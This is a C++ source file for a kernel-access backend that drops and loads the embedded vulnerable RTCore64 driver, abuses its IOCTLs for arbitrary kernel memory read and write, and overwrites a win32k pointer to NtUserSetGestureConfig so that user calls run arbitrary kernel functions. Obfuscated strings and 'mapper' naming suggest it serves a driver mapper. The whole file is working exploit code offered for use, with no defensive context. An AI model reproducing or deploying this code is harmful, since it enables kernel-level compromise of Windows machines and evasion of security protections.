#include "RTCore64Backend.h"
#include "../Common/VulnerableDriverLoader.h"
#include "RTCore64_sys.h"
#include <algorithm>
#include <memory>

namespace
{
	uint64_t GetKernelModuleAddressByName( const char* moduleName )
	{
		if ( !moduleName )
			return 0;

		auto miSpace = r_cast<PRTL_PROCESS_MODULES>( GetSysInfo( SystemModuleInformation ) );

		if ( !miSpace )
			return 0;

		uint64_t result = 0;

		for ( ULONG i = 0; i < miSpace->NumberOfModules; i++ )
		{
			const char* fullName = r_cast<const char*>( miSpace->Modules[ i ].FullPathName );
			const char* currentName = fullName + miSpace->Modules[ i ].OffsetToFileName;

			if ( !_stricmp( currentName, moduleName ) )
			{
				result = r_cast<uint64_t>( miSpace->Modules[ i ].ImageBase );
				break;
			}
		}

		RtlFreeHeap( NtCurrentPeb( )->ProcessHeap, 0, miSpace );

		return result;
	}

	uint64_t GetKernelExportOffset( const wchar_t* moduleName, const char* functionName )
	{
		const auto module = LoadLibraryExW( moduleName, nullptr, DONT_RESOLVE_DLL_REFERENCES );

		if ( !module )
			return 0;

		const auto function = r_cast<uint64_t>( GetProcAddress( module, functionName ) );
		const auto base = r_cast<uint64_t>( module );

		FreeLibrary( module );

		if ( !function )
			return 0;

		return function - base;
	}

}

std::string RTCore64Backend::Name( ) const
{
	return pstra( "RTCore64" );
}

NTSTATUS RTCore64Backend::Load( )
{
	const auto status = KernelRwCallBackend::Load( );

	if ( status != STATUS_SUCCESS )
		return status;

	LoadLibraryW( pstrw( L"user32.dll" ) );
	LoadLibraryW( pstrw( L"win32u.dll" ) );

	m_NtUserSetGestureConfigRef = ResolveNtUserSetGestureConfigRef( );

	if ( !m_NtUserSetGestureConfigRef )
	{
		LOG_SEC( "[-] - [RTCore64] NtUserSetGestureConfig_ref not found" );
		return 0x9170;
	}

	LOG_SEC( "[+] - [RTCore64] NtUserSetGestureConfig_ref 0x%llx", m_NtUserSetGestureConfigRef );
	return STATUS_SUCCESS;
}

NTSTATUS RTCore64Backend::LoadDevice( )
{
	auto image = Tools::DecodePEBuffer( RTCore64_sys, sizeof( RTCore64_sys ) );

	return DropLoadAndOpenMapperDriver( Name( ).c_str( ), pstrw( L"\\\\.\\RTCore64" ), image.data( ), image.size( ), &m_Device, 0x9150 );
}

NTSTATUS RTCore64Backend::UnloadDevice( )
{
	CloseMapperDevice( &m_Device );
	return UnloadMapperDriver( );
}

bool RTCore64Backend::ReadMemory( uint64_t address, void* buffer, size_t size )
{
	auto out = r_cast<uint8_t*>( buffer );
	size_t offset = 0;

	while ( offset < size )
	{
		uint32_t value = 0;
		const auto chunk = s_cast<uint32_t>( std::min<size_t>( 4, size - offset ) );

		if ( !ReadPrimitive( address + offset, chunk, &value ) )
			return false;

		memcpy( out + offset, &value, chunk );
		offset += chunk;
	}

	return true;
}

bool RTCore64Backend::WriteMemory( uint64_t address, const void* buffer, size_t size )
{
	auto in = r_cast<const uint8_t*>( buffer );
	size_t offset = 0;

	while ( offset < size )
	{
		uint32_t value = 0;
		const auto chunk = s_cast<uint32_t>( std::min<size_t>( 4, size - offset ) );

		memcpy( &value, in + offset, chunk );

		if ( !WritePrimitive( address + offset, chunk, value ) )
			return false;

		offset += chunk;
	}

	return true;
}

bool RTCore64Backend::PrepareKernelCall( uint64_t kernelFunctionAddress, void** userFunction, uint64_t* restoreAddress, uint8_t* originalBytes, size_t* originalSize )
{
	if ( !kernelFunctionAddress || !userFunction || !restoreAddress || !originalBytes || !originalSize )
		return false;

	if ( !m_NtUserSetGestureConfigRef )
	{
		LOG_SEC( "[-] - [RTCore64] NtUserSetGestureConfig_ref is null" );
		return false;
	}

	const auto win32u = GetModuleHandleW( pstrw( L"win32u.dll" ) );

	if ( !win32u )
	{
		LOG_SEC( "[-] - [RTCore64] Failed to load win32u.dll" );
		return false;
	}

	*userFunction = r_cast<void*>( GetProcAddress( win32u, pstra( "NtUserSetGestureConfig" ) ) );

	if ( !*userFunction )
	{
		LOG_SEC( "[-] - [RTCore64] Failed to get export win32u!NtUserSetGestureConfig" );
		return false;
	}

	constexpr size_t pointerSize = sizeof( uint64_t );

	if ( !ReadMemory( m_NtUserSetGestureConfigRef, originalBytes, pointerSize ) )
	{
		LOG_SEC( "[-] - [RTCore64] Failed to read NtUserSetGestureConfig_ref 0x%llx", m_NtUserSetGestureConfigRef );
		return false;
	}

	if ( !WriteMemory( m_NtUserSetGestureConfigRef, &kernelFunctionAddress, pointerSize ) )
	{
		LOG_SEC( "[-] - [RTCore64] Failed to write NtUserSetGestureConfig_ref 0x%llx -> 0x%llx", m_NtUserSetGestureConfigRef, kernelFunctionAddress );
		return false;
	}

	*restoreAddress = m_NtUserSetGestureConfigRef;
	*originalSize = pointerSize;
	return true;
}

bool RTCore64Backend::RestoreKernelCall( uint64_t restoreAddress, const uint8_t* originalBytes, size_t originalSize )
{
	if ( !restoreAddress || !originalBytes || originalSize != sizeof( uint64_t ) )
	{
		LOG_SEC( "[-] - [RTCore64] RestoreKernelCall invalid restoreAddress=0x%llx originalBytes=0x%p size=0x%llx",
			restoreAddress, originalBytes, originalSize );
		return false;
	}

	if ( restoreAddress != m_NtUserSetGestureConfigRef )
	{
		LOG_SEC( "[-] - [RTCore64] RestoreKernelCall unexpected restore address 0x%llx expected 0x%llx",
			restoreAddress, m_NtUserSetGestureConfigRef );
		return false;
	}

	if ( !WriteMemory( restoreAddress, originalBytes, originalSize ) )
	{
		LOG_SEC( "[-] - [RTCore64] Failed to restore NtUserSetGestureConfig_ref 0x%llx", restoreAddress );
		return false;
	}

	LOG_SEC( "[*] - [RTCore64] Restored NtUserSetGestureConfig_ref 0x%llx", restoreAddress );
	return true;
}

bool RTCore64Backend::ReadPrimitive( uint64_t address, uint32_t size, uint32_t* value )
{
	MemoryOperation operation {};
	operation.address = address;
	operation.size = size;

	if ( !DeviceIoControl( m_Device, 0x80002048, &operation, sizeof( operation ), &operation, sizeof( operation ), nullptr, nullptr ) )
		return false;

	*value = operation.data;
	return true;
}

bool RTCore64Backend::WritePrimitive( uint64_t address, uint32_t size, uint32_t value )
{
	MemoryOperation operation {};
	operation.address = address;
	operation.size = size;
	operation.data = value;

	return DeviceIoControl( m_Device, 0x8000204C, &operation, sizeof( operation ), &operation, sizeof( operation ), nullptr, nullptr ) != FALSE;
}

uint64_t RTCore64Backend::ResolveNtUserSetGestureConfigRef( )
{
	const auto exportOffset = GetKernelExportOffset( pstrw( L"win32kfull.sys" ), pstra( "NtUserSetGestureConfig" ) );

	LOG_SEC( "[*] - [RTCore64] NtUserSetGestureConfig export offset 0x%llx", exportOffset );

	if ( !exportOffset )
		return 0;

	const auto win32k = GetKernelModuleAddressByName( pstra( "win32k.sys" ) );
	const auto win32kfull = GetKernelModuleAddressByName( pstra( "win32kfull.sys" ) );

	LOG_SEC( "[*] - [RTCore64] win32k=0x%llx win32kfull=0x%llx", win32k, win32kfull );

	if ( !win32k || !win32kfull )
		return 0;

	uint64_t foundPointers[ 256 ] {};
	size_t foundCount = 0;

	// 48 8B 05 ?? ?? ?? ?? 48 85 C0
	if ( FindPatternInSectionAll( pstra( ".text" ), win32k, 
		"\x48\x8B\x05\x00\x00\x00\x00\x48\x85\xC0", pstra( "xxx????xxx" ), 
		foundPointers, _countof( foundPointers ), &foundCount ) )
	{
		for ( size_t i = 0; i < foundCount; ++i )
		{
			const auto pointerAddress = ResolveRelativeAddress( foundPointers[ i ], 3, 7 );

			if ( !pointerAddress )
				continue;

			uint64_t functionAddress = 0;

			if ( !ReadMemory( pointerAddress, &functionAddress, sizeof( functionAddress ) ) )
				continue;

			const auto currentOffset = functionAddress - win32kfull;

			LOG_SEC( "[!] - [RTCore64] pointerAddress=0x%llX, currentOffset=0x%llX, exportOffset=0x%llX", pointerAddress, currentOffset, exportOffset );
			if ( currentOffset != exportOffset )
				continue;

			LOG_SEC( "[+] - [RTCore64] NtUserSetGestureConfig_ref found by win32k ref scan 0x%llX", pointerAddress );
			return pointerAddress;
		}
	}

	LOG_SEC( "[-] - [RTCore64] NtUserSetGestureConfig_ref not found by win32k ref scan, trying SessionState path" );
	return ResolveNtUserSetGestureConfigRefFromSessionState( win32k, win32kfull + exportOffset );
}

uint64_t RTCore64Backend::ResolveNtUserSetGestureConfigRefFromSessionState( uint64_t win32k, uint64_t ntUserSetGestureConfigFull )
{
	DWORD sessionId = 0;
	if ( !ProcessIdToSessionId( GetCurrentProcessId( ), &sessionId ) || !sessionId )
	{
		LOG_SEC( "[-] - [RTCore64] Failed to query current session id" );
		return 0;
	}

	LOG_SEC( "[*] - [RTCore64] Session ID %lu", sessionId );

	// 83 F9 01 73
	auto getSessionStateForSession = FindPatternInSection( pstra( ".text" ), win32k, 
		"\x83\xF9\x01\x73", pstra( "xxxx" ) );

	LOG_SEC( "[*] - [RTCore64] GetSessionStateForSession pattern A 0x%llx", getSessionStateForSession );

	if ( !getSessionStateForSession )
	{
		// 83 F9 01 72
		getSessionStateForSession = FindPatternInSection( pstra( ".text" ), win32k, 
			"\x83\xF9\x01\x72", pstra( "xxxx" ) );

		LOG_SEC( "[*] - [RTCore64] GetSessionStateForSession pattern B 0x%llx", getSessionStateForSession );

		if ( !getSessionStateForSession )
			return 0;

		getSessionStateForSession -= 0x12;
	}

	// 4C 8B 90 ?? ?? ?? ?? 49 8B 82 ?? ?? ?? ?? 48 8B 80
	const auto w32Offsets = FindPatternInSection( pstra( ".text" ), 
		win32k, 
		"\x4C\x8B\x90\x00\x00\x00\x00\x49\x8B\x82\x00\x00\x00\x00\x48\x8B\x80", 
		pstra( "xxx????xxx????xxx" ) );

	LOG_SEC( "[*] - [RTCore64] W32 offsets pattern 0x%llx", w32Offsets );

	if ( !w32Offsets )
		return 0;

	getSessionStateForSession += 0x12;

	// 48 8B 05
	auto sessionGlobalSlots = FindPattern( getSessionStateForSession, 0x100, "\x48\x8B\x05", pstra( "xxx" ) );

	LOG_SEC( "[*] - [RTCore64] gSessionGlobalSlots instruction 0x%llx", sessionGlobalSlots );

	if ( !sessionGlobalSlots )
		return 0;

	sessionGlobalSlots = ResolveRelativeAddress( sessionGlobalSlots, 3, 7 );

	LOG_SEC( "[*] - [RTCore64] gSessionGlobalSlots 0x%llx", sessionGlobalSlots );

	uint64_t sessionGlobalSlotsInstance = 0;

	if ( !ReadMemory( sessionGlobalSlots, &sessionGlobalSlotsInstance, sizeof( sessionGlobalSlotsInstance ) ) )
		return 0;

	LOG_SEC( "[*] - [RTCore64] SessionGlobalSlotsInstance 0x%llx", sessionGlobalSlotsInstance );

	uint64_t table = 0;

	if ( !ReadMemory( sessionGlobalSlotsInstance + 8ull * ( sessionId - 1 ), &table, sizeof( table ) ) )
		return 0;

	LOG_SEC( "[*] - [RTCore64] SessionState table 0x%llx", table );

	uint8_t offsetsData[ 0x50 ] {};

	if ( !ReadMemory( w32Offsets, offsetsData, sizeof( offsetsData ) ) )
		return 0;

	const auto firstOffset = *r_cast<uint32_t*>( offsetsData + 3 );
	const auto secondOffset = 0x150u;

	LOG_SEC( "[*] - [RTCore64] SessionState firstOffset=0x%X secondOffset=0x%X", firstOffset, secondOffset );

	uint64_t table2 = 0;

	if ( !ReadMemory( table + firstOffset, &table2, sizeof( table2 ) ) )
		return 0;

	LOG_SEC( "[*] - [RTCore64] SessionState table2 0x%llx", table2 );

	uint64_t table3 = 0;

	if ( !ReadMemory( table2 + secondOffset, &table3, sizeof( table3 ) ) )
		return 0;

	LOG_SEC( "[*] - [RTCore64] SessionState table3 0x%llx", table3 );

	auto finalTable = std::make_unique<uint64_t[ ]>( 0x1000 / sizeof( uint64_t ) );

	if ( !ReadMemory( table3, finalTable.get( ), 0x1000 ) )
		return 0;

	for ( size_t i = 0; i < ( 0x1000 / sizeof( uint64_t ) ); ++i )
	{
		if ( finalTable[ i ] != ntUserSetGestureConfigFull )
			continue;

		const auto result = table3 + i * sizeof( uint64_t );
		LOG_SEC( "[+] - [RTCore64] NtUserSetGestureConfig_ref found by SessionState 0x%llx offset=0x%llx", result, i * sizeof( uint64_t ) );
		return result;
	}

	return 0;
}
